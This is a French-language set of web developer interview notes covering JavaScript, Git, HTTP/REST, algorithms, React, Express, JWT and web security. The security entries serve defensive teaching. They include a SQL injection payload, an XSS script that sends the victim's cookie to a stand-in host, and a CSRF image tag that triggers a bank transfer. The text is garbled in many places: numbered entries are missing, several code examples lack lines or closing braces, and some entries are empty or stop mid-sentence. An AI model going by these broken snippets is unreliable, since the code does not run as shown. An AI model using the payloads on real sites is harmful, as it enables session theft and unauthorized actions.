## JavaScript (13-24)

**13. `var` vs `let` vs `const`**

Erreur classique avec `var` : il n'a pas de scope de bloc, seulement de fonction.

```js
if (true) {
  var x = 1;
  let y = 2;
}
console.log(x); // 1 — fuite hors du bloc !
console.log(y); // ReferenceError — y n'existe pas ici
```
- `var` : scope fonction, peut être redéclaré, "hoisté" avec valeur `undefined`.
- `let` : scope bloc, réassignable, pas de fuite.
- `const` : scope bloc, non réassignable (mais un objet/tableau `const` reste mutable en interne).

```js
const arr = [1, 2];
arr.push(3); // OK, on modifie le contenu, pas la référence
arr = [4];   // TypeError
```
Règle pratique : `const` par défaut, `let` si réassignation nécessaire, jamais `var`.

---

**14. Hoisting, scope, closure**

- **Hoisting** : les déclarations `var` et `function` sont "remontées" en haut de leur scope avant exécution.
```js
console.log(a); // undefined (pas d'erreur, car hoisté)
var a = 5;
```
- **Scope** : là où une variable est visible (global, fonction, bloc).
- **Closure** : une fonction qui "se souvient" des variables de son environnement de création, même après que celui-ci soit terminé.

```js
function compteur() {
  let n = 0;
  return function() {
    n++;
    return n;
  };
}
const c = compteur();
console.log(c()); // 1
console.log(c()); // 2 — n a survécu !
```
Cas d'usage réel : créer des compteurs indépendants, encapsuler un état privé sans classe.

---

**15. Arrow function vs fonction classique**

```js
function classique() { console.log(this); }
const fleche = () => { console.log(this); };
```
Différence majeure : `this` dans une arrow function est **hérité du contexte parent** (lexical), pas redéfini à l'appel.

**Piège fréquent** :
```js
const objet = {
  nom: "Essama",
  saluerClassique: function() {
    setTimeout(function() { console.log(this.nom); }, 100); // undefined, this = global/undefined
  },
  saluerFleche: function() {
    setTimeout(() => { console.log(this.nom); }, 100); // "Essama" — this hérité correctement
  }
};
```
Autres différences : pas de `arguments`, pas utilisable comme constructeur (`new`).

---

**16. Prototypes et héritage prototypal**

Chaque objet JS a un lien caché vers un autre objet (`[[Prototype]]`), accessible via `__proto__` ou `Object.getPrototypeOf()`.

```js
function Animal(nom) { this.nom = nom; }
Animal.prototype.parler = function() { return `${this.nom} fait du bruit`; };

const chien = new Animal("Rex");
console.log(chien.parler()); // "Rex fait du bruit"
```
Quand vous appelez `chien.parler()`, JS ne trouve pas `parler` sur `chien`, remonte la chaîne de prototypes jusqu'à `Animal.prototype`. Les `class` ES6 sont du sucre syntaxique au-dessus de ce mécanisme.

---

**17. Promise et async/await**

**Erreur classique** : enchaîner des callbacks imbriqués ("callback hell").

```js
// Avec Promise
fetch('/api/user')
  .then(res => res.json())
  .then(data => console.log(data))
  .catch(err => console.error(err));

// Avec async/await (plus lisible)
async function getUser() {
  try {
    const res = await fetch('/api/user');
    const data = await res.json();
    console.log(data);
  } catch (err) {
    console.error(err); // gère les erreurs réseau ET de parsing
  }
}
```
Une `Promise` a 3 états : `pending`, `fulfilled`, `rejected`. `async/await` est juste une syntaxe plus lisible au-dessus des Promises — il faut toujours gérer les erreurs (`try/catch` ou `.catch`).

**18. Le DOM**

Le DOM est la représentation en arbre du document HTML, manipulable via JS.

```js
const titre = document.querySelector('h1');
titre.textContent = "Nouveau titre";
titre.classList.add('actif');

const div = document.createElement('div');
div.innerHTML = "Contenu";
document.body.appendChild(div);
```
**Piège de sécurité** : `innerHTML` avec du contenu utilisateur non filtré = faille XSS. Préférer `textContent` pour du texte brut.

**19. Event listeners et propagation**

```js
document.querySelector('#bouton').addEventListener('click', (e) => {
  console.log('cliqué');
});
```
- **Bubbling** (défaut) : l'événement remonte de l'enfant vers les parents.
- **Capturing** : l'événement descend du parent vers l'enfant (3e argument `true`).

```js
parent.addEventListener('click', () => console.log('parent'));
enfant.addEventListener('click', (e) => {
  console.log('enfant');
  e.stopPropagation(); // empêche la remontée vers 'parent'
});
```
Cas d'usage : fermer un menu déroulant quand on clique en dehors, en écoutant le bubbling sur `document`.

**20. map, filter, reduce**

```js
const nombres = [1, 2, 3, 4, 5];

const doubles = nombres.map(n => n * 2);         // [2,4,6,8,10]
const pairs = nombres.filter(n => n % 2 === 0);  // [2,4]
const somme = nombres.reduce((acc, n) => acc + n, 0); // 15
```
Utile pour transformer des données sans boucles `for` explicites, style plus déclaratif et moins sujet aux erreurs d'index.

**21. Destructuring**

```js
// Objet
const { nom, age } = { nom: "Essama", age: 22 };

// Tableau
const [premier, deuxieme] = [10, 20];

// Avec valeur par défaut et renommage
const { ville: city = "Douala" } = {};
console.log(city); // "Douala"

// Dans les paramètres de fonction
function afficher({ nom, age }) { console.log(`${nom}, ${age} ans`); }
```

**22. `??` et `?.`**

```js
const config = { theme: null };

console.log(config.theme || "clair");  // "clair" — MAIS bug si theme = 0 ou ""
console.log(config.theme ?? "clair");  // "clair" — ne réagit qu'à null/undefined

console.log(config.utilisateur?.nom);  // undefined au lieu de crash si utilisateur n'existe pas
```
**Piège évité** : `||` traite `0`, `""`, `false` comme "vides", ce qui casse la logique avec des nombres ou booléens. `??` ne réagit qu'à `null`/`undefined`.

---

**23. Modules ES6 vs CommonJS**

```js
// ES Modules (navigateur, projets modernes)
export const addition = (a, b) => a + b;
import { addition } from './math.js';

// CommonJS (Node.js historique)
module.exports = { addition };
const { addition } = require('./math');
```
`import` est statique (analysé avant exécution, permet le tree-shaking), `require` est dynamique (exécuté à l'appel). Node.js supporte les deux aujourd'hui selon la config (`"type": "module"` dans `package.json`).

**24. Strict mode**

```js
"use strict";
x = 5; // ReferenceError au lieu de créer silencieusement une variable globale
```
Avantages : erreurs silencieuses deviennent explicites, empêche certaines syntaxes dangereuses, `this` reste `undefined` dans une fonction non-méthode (au lieu de pointer sur `window`). Activé automatiquement dans les modules ES6 et les classes.

## Git & Gestion de Version (25-30)

**25. Git/GitHub — flux de base**

```bash

git commit -m "message"   # enregistre localement
git push origin main      # envoie vers le dépôt distant
```

**26. merge vs rebase**

```bash
# merge : crée un commit de fusion, préserve l'historique réel
git checkout main
git merge feature-branch

# rebase : réécrit l'historique, place vos commits "au-dessus" de main
git checkout feature-branch
git rebase main
```
`merge` = historique fidèle mais avec des commits de fusion parfois "bruyants". `rebase` = historique linéaire et propre, mais **ne jamais rebaser une branche déjà partagée/poussée** avec d'autres — ça réécrit les hash de commits et casse l'historique pour les autres.

**28. Pull Request (PR)**

**29. Branching strategy et Git Flow**

Git Flow définit des branches avec des rôles précis :
- `main` : code en production
- `develop` : intégration continue des features

- `hotfix/*` : correctif urgent en production

**30. Annuler un commit déjà poussé**

```bash
# Sûr : crée un nouveau commit qui annule les changements (garde l'historique)
```

## Architecture & Principes Généraux (31-38)

**31. REST et API RESTful**

REST = Representational State Transfer, un style architectural pour les API web basé sur HTTP.

Principes : ressources identifiées par URL (`/users/42`), verbes HTTP pour l'action (`GET`, `POST`...), pas d'état stocké côté serveur entre requêtes (stateless), réponses généralement en JSON.


GET    /users        → liste tous les utilisateurs
GET    /users/42     → un utilisateur précis
POST   /users        → crée un utilisateur
PUT    /users/42     → remplace entièrement l'utilisateur 42
DELETE /users/42     → supprime l'utilisateur 42


---

**32. GraphQL vs REST**

```graphql
query {
  user(id: 42) {
    nom
    commandes { produit }
  }
}
```
Avec GraphQL, le client demande **exactement** les champs dont il a besoin en une seule requête, contrairement à REST où il faudrait souvent appeler `/users/42` puis `/users/42/commandes` (deux requêtes, potentiel "over-fetching" ou "under-fetching").

Contrepartie : GraphQL est plus complexe à mettre en place côté serveur (résolveurs, schéma), et le caching HTTP classique (utilisé par REST) fonctionne moins naturellement.

**33. Verbes HTTP**

| Verbe | Usage | Idempotent ? |
|---|---|---|
| GET | Lire une ressource | Oui |
| POST | Créer une ressource | Non |
| PUT | Remplacer entièrement une ressource | Oui |
| PATCH | Modifier partiellement | Non (en général) |
| DELETE | Supprimer | Oui |

**Idempotent** = appeler plusieurs fois produit le même résultat final. `POST` crée une nouvelle ressource à chaque appel → non idempotent.

---

**34. Protocole HTTP**

Le client envoie une requête (méthode + URL + headers + body optionnel), le serveur répond avec un statut + headers + body.

```
GET /api/users HTTP/1.1
Host: example.com
Authorization: Bearer <token>

→ Réponse :
HTTP/1.1 200 OK
Content-Type: application/json

{"users": [...]}
```
HTTP est **stateless** : chaque requête est indépendante, le serveur ne "se souvient" pas de la précédente (d'où le besoin de tokens/cookies pour simuler une session).

---

**35. Headers et codes de statut**

```
Content-Type: application/json   → format du corps
Authorization: Bearer xyz        → authentification
Cache-Control: no-cache          → règles de cache
```

| Code | Signification |
|---|---|
| 200 | OK |
| 201 | Créé |
| 400 | Requête invalide (erreur côté client) |
| 401 | Non authentifié |
| 403 | Non autorisé (authentifié mais pas les droits) |
| 404 | Ressource introuvable |
| 500 | Erreur serveur |

**Erreur fréquente** : renvoyer `200` même en cas d'erreur métier ("succès": false dans le body), ce qui casse la gestion d'erreur standard côté client (les intercepteurs HTTP ne la détectent pas).

**36. Architecture MVC**

```
Model      → logique métier + accès aux données (ex: User.js, requêtes SQL)
View       → ce que l'utilisateur voit (HTML, template, JSON de réponse)
Controller → reçoit la requête, appelle le Model, renvoie la View
```

```js
// Controller (Express)
app.get('/users/:id', async (req, res) => {
  const user = await User.findById(req.params.id); // Model
  res.json(user); // "View" en API = juste la donnée JSON

```
Objectif : séparer les responsabilités pour que le code reste maintenable — modifier l'affichage sans toucher à la logique métier, et inversement.

**37. Pair programming**

Pair Programming: pratique de développement ssue de l'Extreme programming (XP) où 
Deux développeurs travaillent ensemble sur le même Poste pour écrire le meme code : un "driver" (écrit au clavier) 
et

**38. Clean Code**

code à facile à lire , à comprendre , à tester et à faire évoluer par n'importe quel développeur, pas seulement par son auteur.
Principes clés :
- Noms explicites : `getUserById` plutôt que `getU`.
- Fonctions courtes, faisant une seule chose (Single Responsibility).

- Éviter les "nombres/chaînes magiques" :

```js
// Bon
```

## Algorithmique et Structures de Données (39-47)

**39. Array vs Linked List**

```
Array :        [10][20][30][40]  → accès direct par index, mémoire contiguë
Linked List :  10 → 20 → 30 → 40 → null  → chaque nœud pointe vers le suivant
```
- Array : accès O(1) par index, mais insertion/suppression au milieu = O(n) (décalage).
- Linked List : insertion/suppression O(1) si on a déjà le nœud, mais accès à un élément = O(n) (parcours obligatoire).

JS n'a pas de vraie linked list native — les tableaux JS sont des arrays dynamiques.

---

**40. Table de hachage**

Une hash table stocke des paires clé-valeur, en utilisant une fonction de hachage pour calculer où stocker chaque clé → accès quasi instantané.

```js
const table = { "essama": 22, "yasmine": 30 }; // objet JS = hash table
console.log(table["essama"]); // 22, accès en O(1) en moyenne
```
**Collision** : deux clés différentes peuvent produire le même "index" de hachage — gérée en interne via chaînage ou adressage ouvert (implémentation invisible en JS).

---

**41. Récursivité**

Une fonction qui s'appelle elle-même, avec un **cas de base** pour arrêter (sinon : stack overflow).

```js
function factorielle(n) {
  if (n <= 1) return 1;        // cas de base — obligatoire
  return n * factorielle(n - 1); // appel récursif
}
console.log(factorielle(5)); // 120
```
**Erreur classique** : oublier le cas de base → boucle infinie qui plante avec `RangeError: Maximum call stack size exceeded`.

---

**42. Algorithmes de tri**

```js
// QuickSort — divise autour d'un pivot
function quickSort(arr) {
  if (arr.length <= 1) return arr;
  const pivot = arr[0];
  const gauche = arr.slice(1).filter(x => x < pivot);
  const droite = arr.slice(1).filter(x => x >= pivot);
  return [...quickSort(gauche), pivot, ...quickSort(droite)];
}
```
- **QuickSort** : rapide en moyenne (O(n log n)), mais pire cas O(n²) si mal pivoté.
- **MergeSort** : divise en deux, trie chaque moitié, fusionne — toujours O(n log n), stable, mais utilise plus de mémoire.

En pratique : `Array.prototype.sort()` en JS suffit dans 99% des cas (implémentation optimisée native).

---

**43. Pile (Stack) vs File (Queue)**

```
Stack (LIFO — dernier entré, premier sorti) : pile d'assiettes
push() → ajoute au sommet
pop()  → retire le sommet

Queue (FIFO — premier entré, premier sorti) : file d'attente
enqueue() → ajoute à la fin
dequeue() → retire le début
```
```js
const stack = [];
stack.push(1); stack.push(2);
stack.pop(); // 2 (LIFO)

const queue = [];
queue.push(1); queue.push(2);
queue.shift(); // 1 (FIFO)
```
Cas d'usage : Stack → historique de navigateur (bouton retour), pile d'appels de fonctions. Queue → traitement de tâches dans l'ordre d'arrivée.

---

**44. Arbre binaire de recherche (BST)**

Chaque nœud a au plus 2 enfants : le sous-arbre gauche contient des valeurs plus petites, le sous-arbre droit des valeurs plus grandes.

```
        8
      /   \
     3     10
    / \      \
   1   6      14
```
Avantage : recherche, insertion, suppression en O(log n) **si l'arbre est équilibré**. Si les insertions sont dans l'ordre croissant, le BST dégénère en liste chaînée (O(n)) — d'où les arbres auto-équilibrés (AVL, Red-Black) en pratique.

---

**45. Recherche binaire**

Fonctionne uniquement sur un tableau **trié**. Divise la zone de recherche par 2 à chaque itération.

```js
function rechercheBinaire(arr, cible) {
  let debut = 0, fin = arr.length - 1;
  while (debut <= fin) {
    const milieu = Math.floor((debut + fin) / 2);
    if (arr[milieu] === cible) return milieu;
    if (arr[milieu] < cible) debut = milieu + 1;
    else fin = milieu - 1;
  }
  return -1; // non trouvé
}
```
Complexité O(log n) — bien plus rapide qu'une recherche linéaire O(n) sur de grandes données, **mais nécessite un tri préalable**, ce qui a un coût (souvent O(n log n)).

---

**46. Notation Big O**

Mesure comment le temps d'exécution (ou la mémoire) croît avec la taille des données `n`.

```js
O(1)   — accès direct     : arr[0]
O(n)   — boucle simple    : for (let i of arr) {...}
O(n²)  — boucles imbriquées : for (i) { for (j) {...} }
O(log n) — recherche binaire
```
**Erreur fréquente en entretien** : confondre "rapide en pratique sur petits jeux de données" avec "bonne complexité" — un algo O(n²) peut sembler instantané sur 10 éléments mais devenir injouable sur 100 000.

---

**47. Debouncing et Throttling**

Utile pour limiter l'exécution d'une fonction déclenchée trop souvent (ex: `scroll`, `resize`, champ de recherche).

```js
// Debounce : attend que l'utilisateur arrête de taper avant d'exécuter
function debounce(fn, delai) {
  let timer;
  return (...args) => {
    clearTimeout(timer);
    timer = setTimeout(() => fn(...args), delai);
  };
}
const rechercherDebounced = debounce(rechercherAPI, 300);
input.addEventListener('input', e => rechercherDebounced(e.target.value));
```
- **Debounce** : n'exécute qu'après une pause d'inactivité (ex: barre de recherche).
- **Throttle** : exécute au maximum une fois par intervalle fixe, peu importe la fréquence des appels (ex: événement `scroll`).

## Sécurité (48-50)

**48. Injection SQL**

```js
// VULNÉRABLE — jamais faire ça
const query = `SELECT * FROM users WHERE email = '${req.body.email}'`;
// Un attaquant envoie : ' OR '1'='1
// → SELECT * FROM users WHERE email = '' OR '1'='1'  → retourne TOUS les utilisateurs
```
**Protection** : requêtes préparées (paramétrées), jamais de concaténation directe.
```js
db.query('SELECT * FROM users WHERE email = ?', [req.body.email]); // le driver échappe automatiquement
```
Avec un ORM (Prisma, Sequelize, Mongoose), ce risque est géré nativement si vous n'utilisez pas de requêtes brutes non paramétrées.

---

**49. XSS (Cross-Site Scripting)**

Un attaquant injecte du JavaScript malveillant qui s'exécute dans le navigateur d'une victime.

```js
// VULNÉRABLE
const commentaire = req.body.commentaire; // "<script>document.location='https://vol.com/'+document.cookie</script>"
element.innerHTML = commentaire; // le script s'exécute chez la victime !
```
**Protection** :
- Utiliser `textContent` au lieu de `innerHTML` pour du texte utilisateur.
- Échapper/sanitiser tout contenu affiché (librairies comme DOMPurify si HTML nécessaire).
- Header `Content-Security-Policy` pour limiter les scripts exécutables.
- React échappe automatiquement le JSX par défaut (`{variable}`), mais `dangerouslySetInnerHTML` réintroduit le risque.

---

**50. CSRF (Cross-Site Request Forgery)**

Un attaquant piège la victime pour qu'elle envoie, à son insu, une requête vers un site où elle est déjà authentifiée (via cookie).

```html
<!-- Sur un site malveillant, alors que la victime est connectée à banque.com -->
<img src="https://banque.com/transfer?to=attaquant&amount=1000">
```
**Protection** :
- Token CSRF unique par session, vérifié à chaque requête sensible.
- Cookies avec `SameSite=Strict` ou `Lax` (empêche l'envoi du cookie depuis un site tiers).
- Vérifier le header `Origin`/`Referer` sur les requêtes sensibles.

## React & Écosystème — début (51-60)

**51. React — concepts clés**

```jsx
function Bienvenue({ nom }) {          // composant fonction
  return <h1>Bonjour, {nom}</h1>;      // JSX = HTML dans du JS
}
```
- **Composants** : blocs réutilisables d'UI.
- **JSX** : syntaxe qui ressemble à du HTML mais compile en `React.createElement(...)`.
- **Virtual DOM** : une copie légère du DOM réel en mémoire ; React compare (diff) l'ancien et le nouveau virtual DOM, puis ne met à jour **que** les vrais éléments DOM qui ont changé — plus rapide qu'une manipulation directe du DOM à chaque changement.

---

**52. Composant classe vs fonction**

```jsx
// Classe (ancienne approche)
class Compteur extends React.Component {
  state = { n: 0 };
  render() { return <button onClick={() => this.setState({n: this.state.n+1})}>{this.state.n}</button>; }
}

// Fonction + Hooks (approche moderne, standard aujourd'hui)
function Compteur() {
  const [n, setN] = useState(0);
  return <button onClick={() => setN(n+1)}>{n}</button>;
}
```
Les composants fonction avec Hooks sont désormais la norme : moins de code, pas de `this` piégeux, logique réutilisable via des hooks personnalisés.

---

**53. Props vs State**

```jsx
function Carte({ titre }) {        // props : reçues du parent, en LECTURE SEULE
  const [ouvert, setOuvert] = useState(false); // state : géré en interne, modifiable
  return (
    <div onClick={() => setOuvert(!ouvert)}>
      <h2>{titre}</h2>
      {ouvert && <p>Détails...</p>}
    </div>
  );
}
```
**Erreur fréquente** : modifier directement une prop (`props.titre = "x"`) — interdit, React ignore/génère une erreur. Une prop ne se modifie que via son composant parent.

**54. React Hooks**

```jsx
const [valeur, setValeur] = useState(0);           // état local
useEffect(() => {                                    // effet de bord (après rendu)
  document.title = `Compteur: ${valeur}`;
  return () => console.log("nettoyage");              // fonction de nettoyage
}, [valeur]);                                          // dépendances

const contexte = useContext(ThemeContext);            // consommer un contexte global
```
Introduits pour remplacer les classes : permettent de réutiliser de la logique avec état (`useState`, `useEffect`...) sans hériter de `React.Component`, et évitent le "wrapper hell" des anciens patterns (HOC empilés).

**Erreur classique avec `useEffect`** : oublier le tableau de dépendances `[valeur]` → l'effet se relance à **chaque** rendu, boucle infinie possible si l'effet modifie l'état qu'il surveille.

**55. Cycle de vie d'un composant**

Avec les Hooks, tout passe par `useEffect` :

```jsx

  console.log("montage");           // équivalent à componentDidMount
  return () => console.log("démontage"); // équivalent à componentWillUnmount
}, []); // tableau vide = exécuté une seule fois

useEffect(() => {
  console.log("mise à jour");       // équivalent à componentDidUpdate
}); // pas de tableau = à chaque rendu
```

**56. State lifting ("remontée d'état")**

Quand deux composants enfants doivent partager un état, on le déplace vers leur parent commun.

```jsx
function Parent() {

    <>
      <Input valeur={valeur} onChange={setValeur} />
      <Affichage valeur={valeur} />
    </>
  );
}
```
Pratique courante car React suit un flux de données **unidirectionnel** (parent → enfant via props) ; il n'y a pas de communication directe entre composants "frères".

**58. Redux vs Context API**

Context = simple, bon pour peu de données globales rarement mises à jour (thème, langue, utilisateur connecté).

Redux = state management structuré avec un store unique, des actions et des reducers, plus adapté quand l'état est complexe et fréquemment modifié.

```js
// Reducer Redux
function panierReducer(state = [], action) {
  switch (action.type) {
    case 'AJOUTER': return [...state, action.produit];
    default: return state;
  }
}
```
**Piège avec Context** : chaque changement de valeur re-rend **tous** les composants qui consomment ce contexte, même ceux qui n'utilisent qu'une petite partie — problème de performance sur un état qui change souvent. Redux (avec `useSelector`) permet un re-rendu plus ciblé.

**59. Higher-Order Component (HOC)**

Une fonction qui prend un composant et retourne un composant amélioré.

```jsx
function avecChargement(Composant) {
  return function(props) {
    if (props.chargement) return <p>Chargement...</p>;
    return <Composant {...props} />;
  };
}
const TableauAvecChargement = avecChargement(Tableau);
```
Utile pour réutiliser une logique transversale (auth, chargement, logging) sur plusieurs composants. Aujourd'hui largement remplacé par les **hooks personnalisés**, plus simples à lire.

**60. Render props**

Pattern où un composant reçoit une **fonction** en prop, qui décide quoi rendre.

```jsx
function Souris({ render }) {
  const [pos, setPos] = useState({ x: 0, y: 0 });
  return <div onMouseMove={e => setPos({x: e.clientX, y: e.clientY})}>{render(pos)}</div>;
}
// Usage :
<Souris render={pos => <p>x: {pos.x}, y: {pos.y}</p>} />
```
Même objectif que les HOC (partager de la logique) — également largement remplacé par les hooks personnalisés aujourd'hui, mais utile de le reconnaître dans du code legacy.

**61. Virtual DOM en détail**

```
1. State change → nouveau Virtual DOM généré
2. React compare (diff) l'ancien vs le nouveau Virtual DOM
3. React calcule le minimum de changements nécessaires (reconciliation)
4. Seuls ces changements sont appliqués au vrai DOM
```
Le DOM réel est lent à manipuler (reflow/repaint coûteux). Le Virtual DOM est une simple structure JS en mémoire, donc les comparaisons y sont rapides. React n'évite pas totalement les manipulations DOM, il les **minimise et les groupe**.

**Piège fréquent** : croire que le Virtual DOM rend React "plus rapide que du JS natif" dans l'absolu — ce n'est pas toujours vrai, l'intérêt est surtout la **simplicité du modèle mental** (on décrit l'UI comme une fonction de l'état, sans manipuler le DOM à la main).

**71. Gérer les erreurs d'appels API en React**

```jsx
function Profil() {
  const [donnees, setDonnees] = useState(null);
  const [erreur, setErreur] = useState(null);
  const [chargement, setChargement] = useState(true);

  useEffect(() => {
    fetch('/api/profil')
      .then(res => { if (!res.ok) throw new Error("Échec"); return res.json(); })
      .then(setDonnees)
      .catch(setErreur)
      .finally(() => setChargement(false));
  }, []);

  if (chargement) return <p>Chargement...</p>;
  if (erreur) return <p>Erreur : {erreur.message}</p>;
  return <p>{donnees.nom}</p>;
}
```
Toujours gérer explicitement 3 états : chargement, erreur, succès — l'erreur la plus fréquente est d'oublier l'état d'erreur et de laisser un écran blanc ou un crash si l'API échoue.

**72. Optimistic UI**

Met à jour l'interface **avant** la confirmation du serveur, pour donner une sensation d'instantanéité — puis annule si l'appel échoue.

```jsx
async function toggleLike(id) {
  setLikes(l => [...l, id]); // mise à jour immédiate, optimiste
  try {
    await fetch(`/api/like/${id}`, { method: 'POST' });
  } catch {
    setLikes(l => l.filter(x => x !== id)); // rollback en cas d'échec
  }
}
```
Utile pour les actions à faible risque d'échec (like, favoris). À éviter pour les actions critiques (paiement) où il vaut mieux attendre la confirmation réelle.

**73. Lazy loading de composants**

```jsx
import { lazy, Suspense } from 'react';

const Dashboard = lazy(() => import('./Dashboard'));

function App() {
  return (

      <Dashboard />
    </Suspense>
  );
}
```
Le code de `Dashboard` n'est téléchargé **que** quand il est réellement affiché, pas au chargement initial de toute l'app. Bénéfice : réduit le bundle JS initial → premier affichage plus rapide, surtout utile pour des pages/routes rarement visitées.

**74. Memoization (React.memo, useMemo, useCallback)**

```jsx

  console.log("rendu Carte");
  return <div>{titre}</div>;
});

// useMemo — évite de recalculer une valeur coûteuse à chaque rendu
const total = useMemo(() => calculLourd(items), [items]);

// useCallback — évite de recréer une fonction à chaque rendu (utile si passée en prop à un enfant memoïsé)
const gererClic = useCallback(() => setCompteur(c => c + 1), []);
```
**Piège classique** : sur-utiliser `useMemo`/`useCallback` partout — ça a un coût (comparaison à chaque rendu) et n'apporte un vrai bénéfice que sur des calculs réellement coûteux ou des composants enfants memoïsés qui re-rendent inutilement sinon.

**75. Optimiser le bundle size**

- Analyser le bundle : `vite-bundle-visualizer` ou `webpack-bundle-analyzer` pour repérer les grosses dépendances inutiles.
- Compresser les images, utiliser des formats modernes.
- Éviter les librairies dupliquées (deux versions de la même lib dans le bundle final).

**77. Qu'est-ce que Node.js**

**78. Modèle non-bloquant (I/O)**

Node.js utilise un seul thread principal mais délègue les opérations lentes (lecture fichier, requête réseau, DB) à l'**event loop** + un pool de threads en arrière-plan, sans bloquer l'exécution.

```js
console.log("1");
fs.readFile('gros-fichier.txt', () => console.log("2 - fichier lu"));
console.log("3");
// Ordre affiché : 1, 3, 2 — la lecture du fichier ne bloque pas la suite du code
```
**Piège classique** : du code **synchrone** lourd (calcul CPU intensif) bloque quand même tout le thread, car Node est mono-thread pour l'exécution JS elle-même — seul l'I/O est non-bloquant. Pour du calcul lourd, il faut des Worker Threads.

**79. CommonJS vs ES Modules dans Node**

```js
// CommonJS (par défaut historiquement)
const express = require('express');
module.exports = maFonction;

// ES Modules (nécessite "type": "module" dans package.json, ou extension .mjs)
import express from 'express';
export default maFonction;
```
Différence technique : CommonJS charge et exécute les modules de façon synchrone et dynamique (le `require` peut être conditionnel), ES Modules sont analysés statiquement avant exécution (meilleur tree-shaking, mais imports/exports doivent être au niveau racine du fichier).

## APIs & Serveur (83-88)

**83. Middleware Express**

Une fonction qui s'exécute **entre** la requête et la réponse finale, avec accès à `req`, `res`, et `next()`.

```js
function logger(req, res, next) {
  console.log(`${req.method} ${req.url}`);
  next(); // OBLIGATOIRE, sinon la requête reste bloquée indéfiniment
}

app.use(logger); // appliqué à toutes les routes

function verifierAuth(req, res, next) {
  if (!req.headers.authorization) return res.status(401).json({ erreur: "Non authentifié" });
  next();
}
app.get('/admin', verifierAuth, (req, res) => res.send("Zone admin"));
```
**Erreur classique** : oublier d'appeler `next()` → la requête reste en attente indéfiniment (timeout côté client).

**84. Gestion des erreurs dans une API Express**

```js
// Route qui peut échouer
app.get('/users/:id', async (req, res, next) => {
  try {
    const user = await User.findById(req.params.id);
    if (!user) return res.status(404).json({ erreur: "Utilisateur introuvable" });
    res.json(user);
  } catch (err) {
    next(err); // transmet au middleware d'erreur
  }
});

// Middleware d'erreur global — DOIT avoir 4 paramètres
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).json({ erreur: "Erreur serveur" });
});
```
Traiter les cas d'erreur **avant** le succès : ressource introuvable (404), entrée invalide (400), erreur serveur inattendue (500) — toujours capturée par `try/catch` sur du code async, sinon Node peut crasher silencieusement sur une Promise rejetée non gérée.

**90. JWT (JSON Web Token)**

```js
const jwt = require('jsonwebtoken');

// Génération à la connexion
const token = jwt.sign({ userId: user.id }, process.env.JWT_SECRET, { expiresIn: '1h' });

// Vérification sur les routes protégées
function verifierAuth(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1]; // "Bearer <token>"
  if (!token) return res.status(401).json({ erreur: "Token manquant" });
  try {
    req.user = jwt.verify(token, process.env.JWT_SECRET);
    next();
  } catch {
    res.status(401).json({ erreur: "Token invalide ou expiré" });
  }
}
```
Un JWT contient 3 parties (header, payload, signature) encodées en Base64, séparées par des points. Le serveur n'a pas besoin de stocker de session — la signature garantit que le contenu n'a pas été altéré (mais **le payload n'est pas chiffré**, ne jamais y mettre d'info sensible comme un mot de passe).

---

**91. OAuth 2.0**

Protocole permettant à un utilisateur de se connecter à une application via un compte tiers (Google, GitHub) sans partager son mot de passe avec cette application.

```
1. L'utilisateur clique "Se connecter avec Google"
2. Redirection vers Google → l'utilisateur autorise l'accès
3. Google renvoie un code d'autorisation à l'application
4. L'application échange ce code contre un access token
5. L'application utilise ce token pour accéder aux données autorisées (ex: email, profil)
```
Cas d'usage typique : "Se connecter avec Google/GitHub/Facebook", ou une app tierce qui accède à votre Google Drive avec votre permission explicite.

---

**92. Refresh token**

```
Access token  : courte durée de vie (ex: 15 min), utilisé pour chaque requête
Refresh token : longue durée de vie (ex: 7 jours), stocké de façon sécurisée (cookie httpOnly), utilisé UNIQUEMENT pour obtenir un nouvel access token
```
```js
app.post('/refresh', (req, res) => {
  const { refreshToken } = req.cookies;
  const payload = jwt.verify(refreshToken, process.env.REFRESH_SECRET);
  const nouvelAccessToken = jwt.sign({ userId: payload.userId }, process.env.JWT_SECRET, { expiresIn: '15m' });
  res.json({ accessToken: nouvelAccessToken });
});
```
Pourquoi : limite la fenêtre d'exploitation si un access token est volé (courte durée de vie), sans forcer l'utilisateur à se reconnecter toutes les 15 minutes.

---

**93. Sécuriser un mot de passe (hashing + salage)**

```js
const bcrypt = require('bcrypt');

// À l'inscription
const motDePasseHash = await bcrypt.hash(motDePasseClair, 10); // 10 = coût du salage
await User.create({ email, motDePasse: motDePasseHash });

// À la connexion
const utilisateur = await User.findOne({ email });
const estValide = await bcrypt.compare(motDePasseClair, utilisateur.motDePasse);
```
**Ne jamais stocker un mot de passe en clair.** Le hashing transforme le mot de passe en une empreinte irréversible ; le "salage" (intégré automatiquement par bcrypt) ajoute une donnée aléatoire unique par mot de passe, empêchant les attaques par table arc-en-ciel (rainbow tables) même si deux utilisateurs ont le même mot de passe.

## Sécurité Back-End (94-96)

**94. CORS**

Par défaut, un navigateur bloque les requêtes JS depuis un domaine A vers une API sur un domaine B (Same-Origin Policy). CORS permet au serveur d'autoriser explicitement certains domaines.

```js
const cors = require('cors');
app.use(cors({
  origin: 'https://mon-frontend.com', // seul ce domaine peut appeler l'API
  credentials: true // autorise l'envoi de cookies cross-origin
}));
```
**Erreur classique** : mettre `origin: '*'` en production avec `credentials: true` — combinaison interdite par les navigateurs pour raison de sécurité, et `*` en général trop permissif pour une API avec authentification.

---

**95. Validation des entrées utilisateur**

```js
const { body, validationResult } = require('express-validator');

app.post('/users',
  body('email').isEmail(),
  body('age').isInt({ min: 0, max: 120 }),
  (req, res) => {
    const erreurs = validationResult(req);
    if (!erreurs.isEmpty()) return res.status(400).json({ erreurs: erreurs.array() });
    // traitement normal
  }
);
```
Cruciale car : empêche les injections (SQL, NoSQL), évite des données corrompues en base, protège contre des payloads malveillants ou surdimensionnés. **Règle d'or** : ne jamais faire confiance aux données venant du client, même si le front-end valide déjà — un attaquant peut appeler l'API directement en contournant le front.

---

**96. Sécuriser une API REST — bonnes pratiques**

- HTTPS obligatoire (jamais de token/mot de passe en clair sur le réseau).
- Authentification sur toutes les routes sensibles (JWT, sessions).
- Validation stricte des entrées (voir 95).
- Rate limiting pour éviter les attaques par force brute :
```js
const rateLimit = require('express-rate-limit');
app.use('/api/login', rateLimit({ windowMs: 15*60*1000, max: 5 })); // 5 tentatives / 15 min
```
- Headers de sécurité (`helmet` middleware) : `X-Content-Type-Options`, `X-Frame-Options`, etc.
- Ne jamais exposer de messages d'erreur détaillés (stack trace) en production — donner des infos exploitables à un attaquant.

## Bases de Données — Principes (97-100)

**97. SQL vs NoSQL**

